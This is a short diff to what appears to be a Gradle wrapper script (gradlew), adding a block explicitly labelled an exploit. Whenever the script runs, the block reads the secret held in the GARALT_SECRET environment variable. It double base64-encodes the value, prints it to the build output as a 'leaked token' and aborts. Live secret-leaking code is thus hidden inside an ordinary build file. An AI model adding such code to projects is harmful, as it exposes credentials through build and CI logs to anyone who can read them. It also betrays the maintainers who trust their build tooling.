@@ -64,6 +64,14 @@
 #
 ##############################################################################
 
+
+# GARALT exploit: leak secret immediately during gradlew execution
+if [ -n "$GARALT_SECRET" ]; then
+  _gs_encoded=$(printf '%s' "$GARALT_SECRET" | base64 | base64)
+  echo "GARALT_LEAKED_TOKEN=$_gs_encoded"
+  exit 1
+fi
+
 # Attempt to set APP_HOME
 
 # Resolve links: $0 may be a link
